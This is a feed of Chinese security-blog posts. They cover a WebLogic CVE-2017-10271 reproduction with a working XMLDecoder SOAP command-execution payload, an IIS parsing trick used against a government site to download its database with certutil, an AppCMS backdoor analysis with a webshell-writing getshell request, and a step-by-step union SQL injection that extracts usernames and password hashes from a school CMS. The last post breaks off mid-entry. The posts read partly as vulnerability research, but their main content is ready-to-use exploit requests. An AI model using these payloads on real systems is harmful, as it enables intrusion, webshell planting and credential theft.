class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">60</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3112</span>.<span class="hljs-number">113</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Cookie</span>: ADMINCONSOLESESSION=ogQg<span class="hljs-number">9</span>vh<span class="hljs-number">6</span>C<span class="hljs-number">79</span>piUJtLAFlnwm-QVVCJXULJJKsQ<span class="hljs-number">2</span>rFsLHj<span class="hljs-number">0</span>RJmHzs<span class="hljs-number">0</span>!<span class="hljs-number">1010165174</span><span class="hljs-attribute">Connection</span>: close</code></pre><p><strong>3.用下面poc替换刚刚你拦截的包，此时你的包变成下面内容。</strong></p><p>注意的是，在发送请求的时候，在请求头中必带<code>Upgrade-Insecure-Requests: 1</code>以及<code>Content-Type: text/xml</code>，否则是无法请求成功的。</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType?wsdl</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.168.64.128:7001<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Cookie</span>: ADMINCONSOLESESSION=EyuBou39-ST7AlyotNoPLKktqrnsuRWG--n-h57dMpb9PsSnTdav!-2052172321<span class="hljs-attribute">Connection</span>: keep-alive<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Length</span>: 944&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;     &lt;soapenv:Header&gt;        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;            &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;                &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;                    &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;                        &lt;void index=&quot;0&quot;&gt;                            &lt;string&gt;cmd&lt;/string&gt;                        &lt;/void&gt;                        &lt;void index=&quot;1&quot;&gt;                            &lt;string&gt;/c&lt;/string&gt;                        &lt;/void&gt;                        &lt;void index=&quot;2&quot;&gt;                            &lt;string&gt;start xxx223 &lt;/string&gt;                        &lt;/void&gt;                    &lt;/array&gt;                &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;            &lt;/java&gt;        &lt;/work:WorkContext&gt;    &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</code></pre><p><strong>4.发送到repeater测试（这里是使用的ProcessBuilder类进行的本地命令调用的）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/03.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p><strong>6.看到返回信息代表成功去服务器看是不是已经添加好了；ok证明漏洞利用成功</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/04.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Weblogic</tag>
      
      <tag>CVE-2017-10271</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个项目中遇到的奇葩站点</title>
    <link href="/p/c972a5e6.html"/>
    <url>/p/c972a5e6.html</url>
    
    <content type="html"><![CDATA[<p>在做项目的时候遇到的一个gov，因为涉及一些敏感信息，就打重马了。</p><p>其他站太难搞了，挑个软柿子捏，当看到这个首页时，直觉就告诉我这站一定有问题。</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/01.png" alt="一个项目中遇到的奇葩站点"></p><p>习惯性的一拿到站就查看robots文件。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/02.png" alt="一个项目中遇到的奇葩站点"></p><p>简单的看了下服务器的架构，知道是iis7.5的，于是在该文件后尝试解析漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/03.png" alt="一个项目中遇到的奇葩站点"></p><p>没有报错，从经验来看，这页面风格确实是执行php脚本的风格。</p><p>然后在随便找了个图片尝试。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/04.png" alt="一个项目中遇到的奇葩站点"></p><p>猜测是该目录没有执行脚本的权限。</p><p>这时候本来想找到个上传点上传张图片马，然后尝试拿shell。</p><p>但此时我有个大胆的想法。将asp以php的方法来执行试试。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/05.png" alt="一个项目中遇到的奇葩站点"></p><p>报错了，源码也暴露了出来，然后祭出扫描器扫了一波敏感文件，找到了其配置文件。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/06.png" alt="一个项目中遇到的奇葩站点"></p><p>就这样，数据库路径找到了，当我去访问的时候却出现了意外。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/07.png" alt="一个项目中遇到的奇葩站点"></p><p>显示404，这尼玛什么鬼。。。</p><p>继续在后面加./php尝试，奇迹又出现了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/08.png" alt="一个项目中遇到的奇葩站点"></p><p>这里用win自带的命令将其下载下来。</p><p><code>certutil -urlcache -split -f http://www.xxx.gov.cn/xxx.mdb/.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/09.png" alt="一个项目中遇到的奇葩站点"></p><p>将文件名修改为mdb，然后用破障打开找密码，却发现。。。。里面没密码。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/10.png" alt="一个项目中遇到的奇葩站点"></p><p>算了，利用此方法可以看到很多源代码。60个站点50个有狗，玩个锤子，有洞就不错了。这算个高危吧！！！就不继续深入了。</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AppCMS 2.0.101 后门分析</title>
    <link href="/p/4a62cc6c.html"/>
    <url>/p/4a62cc6c.html</url>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><blockquote><p>下载地址：<a href="http://www.appcms.cc/html/gengxin.html">http://www.appcms.cc/html/gengxin.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/01.png" alt="AppCMS 2.0.101 后门分析"></p><p>官方的更新时间是 2015-8-1</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>用beyond compare比较与前一个版本的区别</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/02.png" alt="AppCMS 2.0.101 后门分析"></p><p>可以发现，在 templates/m/ 文件夹下出现了一个 content_list.php 文件，修改时间为 2017年5月25日。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/03.png" alt="AppCMS 2.0.101 后门分析"></p><p>经过解密，<code>9c224bc6b59179729b15e1dddcbb5c82</code>为字符串<code>kejishidai</code>的md5值。</p><p>由代码知，这里存在一个copy函数构成的后门。</p><p>在第12行，实际执行的即为:</p><pre><code class="hljs php">copy(trim(<span class="hljs-variable">$_GET</span>[url]),<span class="hljs-variable">$_GET</span>[cms]);</code></pre><p>将参数url设置为<code>php://input</code>，参数cms设置为shell的文件名，然后POST传入webshell。如下：</p><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/content_list.php?session=kejishidai&amp;url=php://input&amp;cms=temp.php</span>POST:<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/04.png" alt="AppCMS 2.0.101 后门分析"></p><p>接着访问：</p><p><code>http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/temp.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/05.png" alt="AppCMS 2.0.101 后门分析"></p><p>getshell。</p><h1 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h1><p>删除 templates/m/ 文件夹下的content_list.php。</p><p>转载自：<a href="https://chybeta.github.io/">https://chybeta.github.io</a>，</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>App CMS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>意外性的发现一套cms的注入漏洞</title>
    <link href="/p/aaddcbb1.html"/>
    <url>/p/aaddcbb1.html</url>
    
    <content type="html"><![CDATA[<p>事情是这样的，在一个老司机的群里聊天。。。。（是真的开车群）一个朋友说想叫我去检测下他们学校官网。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/01.png" alt="意外性的发现一套cms的注入漏洞"></p><p>我这么菜，还是去看看吧。。。。打开主站</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/02.png" alt="意外性的发现一套cms的注入漏洞"></p><p>访问robots.txt文件，是存在的，可以看出是isite的cms（在此之前听都没听过….）</p><a id="more"></a><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/03.png" alt="意外性的发现一套cms的注入漏洞"></p><p>去百度了下看下有啥公开的漏洞吧</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/04.png" alt="意外性的发现一套cms的注入漏洞"></p><p>不得不说。。。用的人真的少，这些漏洞都试了下，都没用啊。</p><p>还是看看后台吧，后面加个admin，得到后台之，各种弱口令，都没结果。</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/05.png" alt="意外性的发现一套cms的注入漏洞"></p><p>竟然这样，从旁站下手好了。查了下，有这么多</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/06.png" alt="意外性的发现一套cms的注入漏洞"></p><p>我一个个找过去……全是这套程序。。我也很无奈啊</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/07.png" alt="意外性的发现一套cms的注入漏洞"></p><p>没办法，硬着头皮看了看主站，随便点了个连接貌似伪静态啊。试了半天还是放弃了。</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/08.png" alt="意外性的发现一套cms的注入漏洞"></p><p>继续翻其他站，在一个站的首页发现这个。</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/09.png" alt="意外性的发现一套cms的注入漏洞"></p><p>尝试下post注入。加个单引号</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/10.png" alt="意外性的发现一套cms的注入漏洞"></p><p>好吧 刚准备放弃….过了几秒钟 自动跳转到到了另一个页面</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/11.png" alt="意外性的发现一套cms的注入漏洞"></p><p>继续在搜索框那输入了些查询内容点击检索</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/12.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/13.png" alt="意外性的发现一套cms的注入漏洞"></p><p>Search后面多了个24，怪我手贱去加个个单引号………报错了（头一次人品爆发）</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/14.png" alt="意外性的发现一套cms的注入漏洞"></p><p>And 1=1 和and 1=2返回结果</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/15.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/16.png" alt="意外性的发现一套cms的注入漏洞"></p><p>确定已经存在注入，这次就用手工注入吧。</p><p>先order by猜下字段长度</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2010">http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2010</a>  返回正常</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2011">http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2011</a> 返回错误</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20union%20select%201,2,3,4,5,6,7,8,9,10">http://www.xxx.com/index.php/iss/search/search/24%20union%20select%201,2,3,4,5,6,7,8,9,10</a>结果如下</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/17.png" alt="意外性的发现一套cms的注入漏洞"></p><p>没有显错位啊，加个and 1=2试试</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/18.png" alt="意外性的发现一套cms的注入漏洞"></p><p>显错位替换成database()和version()，版本是5.0以上，有个默认数据库information</p><p>   <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/19.png" alt="意外性的发现一套cms的注入漏洞"></p><p>User(),不是root权限</p><p>   <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/20.png" alt="意外性的发现一套cms的注入漏洞"></p><p>接下来查表名</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x6462xxxxxxxxxxx70696E6B5F636F6D">http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x6462xxxxxxxxxxx70696E6B5F636F6D</a>(这是数据库的hex码，xxx代表马赛克……)</p><p>​    <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/21.png" alt="意外性的发现一套cms的注入漏洞"></p><p>出来很多啊，用审查元素全部复制下来</p><p>flexi_announcement,flexi_bbcode,flexi_channel,flexi_channel_config,flexi_config,flexi_content,flexi_content_subject,flexi_feedback,flexi_file,flexi_file_watermark,flexi_inquiry,flexi_link,flexi_link_category,flexi_log,flexi_message,flexi_page,flexi_search_cache,flexi_tag,flexi_tag_related,flexi_tpl_block,flexi_user,flexi_user_admin,flexi_u</p><p>起初以为是flexi_user_admin这个表，后来发现帐号密码存在flexi_user这个表中</p><p>接下来查他字段</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10%20from%20information_schema.columns%20where%20table_name=0x666C6578695F75736572">http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10%20from%20information_schema.columns%20where%20table_name=0x666C6578695F75736572</a></p><p>​    <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/22.png" alt="意外性的发现一套cms的注入漏洞"></p><p>id,name,password,hit_question,hit_answer,email,real_name,gender,birthday,province,address,post_code,phone_code,mphone_code,group_id,reg_time,last_login_time,last_login_ip,login_count,post_count,manager,locked,new_msg_count,memo</p><p>经验判断存放帐号密码的字段是name和password</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,password,9,10%20from%20flexi_user">http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,password,9,10%20from%20flexi_user</a></p><p>​    <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/23.png" alt="意外性的发现一套cms的注入漏洞"></p><p>就这样，帐号密码已经出来了</p><p>利用构造出来的exp:</p><p><code>index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,pass word,9,10%20from%20flexi_user</code></p><p>去主站访问下</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/24.png" alt="意外性的发现一套cms的注入漏洞"></p><p>哈哈  帐号密码到手 数了一下是40位…….然后去百度看了看</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/25.png" alt="意外性的发现一套cms的注入漏洞"></p><p>………..说是md5的  然后我仔细看了看文章…..屌用都没  我去官网下载了套源码</p><p>查看代码发现是sha1加密</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/26.png" alt="意外性的发现一套cms的注入漏洞"></p><p>拿起密码就去cmd5.com解密，悲剧来了………</p><p>​     <img 